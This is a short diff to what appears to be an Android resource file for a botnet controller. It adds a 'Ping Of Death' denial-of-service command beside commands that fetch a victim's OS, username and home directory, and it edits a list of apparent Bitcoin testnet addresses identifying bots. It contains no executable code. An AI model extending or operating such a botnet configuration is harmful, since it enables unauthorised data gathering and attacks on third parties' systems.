@@ -10,9 +10,11 @@
         <item>Get OS</item>
         <item>Get Username</item>
         <item>Get User Home</item>
+        <item>Ping Of Death</item>
     </array>
 
     <array name="botList">
+        <item>mkxJprAR7wAZH4EkSapaVpsPqw5drGUE4c</item>
         <item>mvSWLyXqcQxouanZMtUbv5wmJnsBt3bfSj</item>
         <item>mgCryBENg88N6HfJieZNa7xcT9wZS6dwe3</item>
         <item>mnHZGiRzPDscqCFuVY2YqaAzvLcQcfEoFe</item>
@@ -24,6 +26,6 @@
         <item>mxJzSqy6ayKsVBs3AyBHQuLDaL9xkC3x9X</item>
         <item>mfqL3swtYVxBeCAEn6sAXSTZ4gBJMGuF93</item>
         <item>miRsiqgGxjzj7n3QY2ntrEvKdmbWWkm6J3</item>
-        <item>mkxJprAR7wAZH4EkSapaVpsPqw5drGUE4c</item>
+        <item>muyrQbN3rrfuVbJEuYQxSvDkb68KyW6LN1</item>
     </array>
 </resources>
